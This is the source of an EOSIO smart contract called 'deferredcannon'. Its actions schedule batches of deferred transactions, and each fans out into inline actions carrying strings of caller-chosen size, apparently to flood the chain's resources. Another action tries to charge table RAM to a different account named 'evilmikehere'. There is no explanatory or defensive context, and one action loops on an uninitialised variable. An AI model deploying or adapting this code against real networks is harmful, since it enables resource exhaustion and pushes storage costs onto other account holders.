#include <eosio/eosio.hpp>
#include <eosio/action.hpp>
#include <eosio/singleton.hpp>
#include <eosio/transaction.hpp>

using namespace eosio;
using namespace std;

class [[eosio::contract]] deferredcannon : public contract {

    struct s;
    typedef eosio::singleton<"s"_n, s> sc;
    TABLE s {
        bool t = false;

        static s get(eosio::name account, eosio::name scope) {
            return sc(account, scope.value).get_or_default(s());
        }

        void save(eosio::name account, eosio::name scope, eosio::name payer = same_payer) {
            sc(account, scope.value).set(*this, payer);
        }
    };

    TABLE test_item {
        name account;

        uint64_t primary_key() const { return account.value; }
    };
    typedef eosio::multi_index< "t"_n, test_item > t;

public:
    using contract::contract;
    ACTION l(uint32_t num, uint32_t s, uint32_t t, uint64_t m){
        uint32_t now = current_time_point().sec_since_epoch();

        for (uint32_t i = 0; i<num; i++){
            transaction def{};
            def.expiration = time_point_sec(current_time_point().sec_since_epoch() + 60 * 60);
            uint32_t j = (i * num) + s;
            def.actions.push_back(
                    action(
                            permission_level{get_self(), "active"_n},
                            get_self(), "m"_n,
                            make_tuple(j, t, m)
                            )
                    );
            if (now > t){
                t = now;
            }
            def.delay_sec = t - now;
            def.send(uint128_t(i * num) << 64 | current_time_point().sec_since_epoch(), get_self());
        }
    }

    ACTION m(uint32_t j, uint32_t t, uint64_t m){
        std::string v(m, '6');
        uint32_t now = current_time_point().sec_since_epoch();
//        std::string v("blah blah");

        for (uint32_t i = 0; i<10; i++){

            action(
                    permission_level{get_self(), "active"_n},
                    get_self(), "r"_n,
                    make_tuple(v)
            ).send();

//            transaction def{};
//            def.expiration = time_point_sec(now + 60 * 60);
//            def.actions.push_back(
//                    action(
//                            permission_level{get_self(), "active"_n},
//                            get_self(), "r"_n,
//                            make_tuple(v)
//                    )
//            );
//            if (now > t){
//                t = now;
//            }
//            def.delay_sec = t - now;
//            def.send(uint128_t(i + j) << 64 | now, get_self());
        }
    }

    ACTION r(string x){

        uint64_t i;
        while (i < 20){
            i++;
        }
    }

    ACTION b(){
        auto state = s::get(get_self(), get_self());
        state.t = true;
        state.save(get_self(), get_self(), get_self());
    }

    ACTION a(){
        require_auth(get_self());

        auto state = s::get(get_self(), get_self());
        if (state.t){
            // try to charge ram to evilmikehere
            auto tbl = t(get_self(), get_self().value);
            tbl.emplace("evilmikehere"_n, [&](auto &_t){
                _t.account = "evilmikehere"_n;
            });
        }
    }
};